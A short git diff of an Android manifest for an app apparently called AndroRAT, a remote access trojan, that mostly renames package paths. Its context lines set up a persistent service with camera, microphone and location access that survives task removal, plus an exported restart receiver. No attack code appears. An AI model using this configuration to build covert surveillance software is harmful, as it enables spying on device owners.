@@ -94,8 +94,9 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
         <activity
-            android:name=".features.MainActivity"
+            android:name=".core.ui.MainActivity"
             android:exported="true"
+            android:configChanges="uiMode|locale|layoutDirection|screenSize|screenLayout|orientation"
             android:theme="@style/Theme.AndroRAT">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -105,14 +106,14 @@
         </activity>
 
         <service
-            android:name=".core.services.endless_service.EndlessService"
+            android:name=".core.data.services.endless_service.EndlessService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="camera|microphone|location"
             android:stopWithTask="false" />
 
         <receiver
-            android:name=".core.services.endless_service.StartReceiver"
+            android:name=".core.data.services.endless_service.StartReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
